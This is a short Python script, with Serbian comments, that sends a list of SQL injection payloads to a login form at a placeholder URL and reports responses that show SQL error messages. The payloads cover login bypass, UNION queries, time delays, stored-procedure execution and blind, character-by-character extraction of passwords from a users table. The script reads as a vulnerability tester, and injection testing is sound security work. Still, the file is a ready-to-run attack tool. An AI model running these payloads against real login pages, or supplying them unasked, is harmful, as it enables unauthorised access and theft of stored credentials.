import requests
from urllib.parse import urlencode

# Ciljani URL
target_url = 'http://example.com/login'

# Podaci koji se koriste u običnom POST zahtevu
data = {
    'username': 'admin',
    'password': 'password'
}

# SQL Injection testni nizovi
test_strings = [
    "' OR '1'='1';--",   
    "' OR '1'='1'/*",    
    "admin' --",         
    "admin' #",          
    "admin'/*",         
    "' OR 1=1--",       
    "' UNION SELECT 1, 'a', 3--",  
    "' EXECUTE sp_helpdb--",  
    "'; WAITFOR DELAY '0:0:5'--",  
    "' OR EXISTS(SELECT * FROM users WHERE name LIKE '%a%')--",  
    "' AND 1=(SELECT COUNT(*) FROM users);--",  
    "' AND 1=CAST((SELECT TOP 1 name FROM users) AS INT);--",  
    "' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users), 1, 1)) > 104;--"  
]


def test_sql_injection(url, data):
    for test in test_strings:
        # Modifikacija vrednosti parametara za testiranje SQL Injection
        injected_data = data.copy()
        injected_data['username'] = test
        injected_data['password'] = test
        # Slanje zahteva
        response = requests.post(url, data=urlencode(injected_data))
        # Provera odgovora za tipične greške SQL-a
        if "SQL syntax" in response.text or "mysql_fetch_array" in response.text:
            print(f"Potential SQL Injection vulnerability found with payload: {test}")
        else:
            print(f"No vulnerability found with payload: {test}")

# Pokretanje testa
test_sql_injection(target_url, data)
